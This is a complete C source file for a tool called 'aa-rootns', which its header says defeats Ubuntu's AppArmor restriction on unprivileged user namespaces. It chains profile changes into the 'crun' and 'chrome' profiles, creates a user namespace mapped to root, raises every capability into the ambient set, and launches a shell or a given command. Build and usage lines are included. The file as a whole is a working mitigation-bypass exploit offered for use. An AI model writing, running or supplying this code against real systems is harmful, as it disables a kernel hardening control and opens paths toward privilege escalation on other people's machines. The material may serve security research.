/*
 * aa-rootns — defeat Ubuntu apparmor_restrict_unprivileged_userns
 *
 *   stage 0: change_onexec(crun);   execv self  — enter unconfined profile
 *   stage 1: change_onexec(chrome); execv self  — double-hop, optional
 *   stage 2: unshare(CLONE_NEWUSER); write uid_map / gid_map; capset I=P;
 *            raise all caps into Ambient; execvp target.
 *
 * Build:  gcc -O2 -Wall -o aa-rootns aa-rootns.c
 * Use:    ./aa-rootns -p           # proof of caps
 *         ./aa-rootns -- id        # run command in the userns
 *         ./aa-rootns -n -- cmd    # also unshare(NEWNET) before exec
 *
 * No funny business. Standard libc, no eBPF, no JIT, no kernel module.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <linux/capability.h>

static int change_onexec(const char *p) {
    int fd = open("/proc/self/attr/exec", O_WRONLY);
    if (fd < 0) return -1;
    char b[256]; int n = snprintf(b, sizeof b, "exec %s", p);
    ssize_t r = write(fd, b, n); int e = errno;
    close(fd); errno = e; return r == n ? 0 : -1;
}
static void wfile(const char *p, const char *c) {
    int fd = open(p, O_WRONLY); if (fd < 0) return;
    (void)!write(fd, c, strlen(c)); close(fd);
}

#define TAG "AA-ROOTNS-STAGE-"

static int stage1(int ac, char **av) {
    if (change_onexec("chrome") < 0) return perror("chrome"), 1;
    av[1] = (char *)TAG "2"; execv("/proc/self/exe", av);
    return perror("execv s2"), 1;
}
static int stage2(int ac, char **av) {
    int newnet = 0;
    int proof = 0;
    int sep = -1;
    for (int i = 2; i < ac; i++) {
        if (!strcmp(av[i], "--")) { sep = i; break; }
        if (!strcmp(av[i], "-n")) newnet = 1;
        else if (!strcmp(av[i], "-p")) proof = 1;
    }

    uid_t u = getuid(); gid_t g = getgid();
    int flags = CLONE_NEWUSER;
    if (newnet) flags |= CLONE_NEWNET;
    if (unshare(flags) < 0) return perror("unshare"), 1;
    wfile("/proc/self/setgroups", "deny");
    char m[64];
    snprintf(m, sizeof m, "0 %u 1", u); wfile("/proc/self/uid_map", m);
    snprintf(m, sizeof m, "0 %u 1", g); wfile("/proc/self/gid_map", m);
    (void)!setresuid(0, 0, 0); (void)!setresgid(0, 0, 0);

    struct __user_cap_header_struct h = { _LINUX_CAPABILITY_VERSION_3, 0 };
    struct __user_cap_data_struct d[2] = {0};
    syscall(SYS_capget, &h, d);
    d[0].inheritable = d[0].permitted;
    d[1].inheritable = d[1].permitted;
    syscall(SYS_capset, &h, d);
    for (int c = 0; c < 64; c++)
        prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, c, 0, 0);

    if (proof) {
        printf("uid=%d euid=%d  caps eff=0x%llx perm=0x%llx\n",
               getuid(), geteuid(),
               ((unsigned long long)d[1].effective << 32) | d[0].effective,
               ((unsigned long long)d[1].permitted << 32) | d[0].permitted);
        return 0;
    }

    char *def[] = { (char *)"/bin/bash", NULL };
    char **t = (sep > 0 && sep + 1 < ac) ? &av[sep + 1] : def;
    execvp(t[0], t); return perror("execvp"), 1;
}
int main(int ac, char **av) {
    if (ac >= 2 && !strcmp(av[1], TAG "1")) return stage1(ac, av);
    if (ac >= 2 && !strcmp(av[1], TAG "2")) return stage2(ac, av);
    if (change_onexec("crun") < 0) { perror("crun"); return 1; }
    char **a = calloc(ac + 2, sizeof *a);
    a[0] = av[0]; a[1] = (char *)TAG "1";
    for (int i = 1; i < ac; i++) a[i + 1] = av[i];
    execv("/proc/self/exe", a);
    return perror("execv s1"), 1;
}
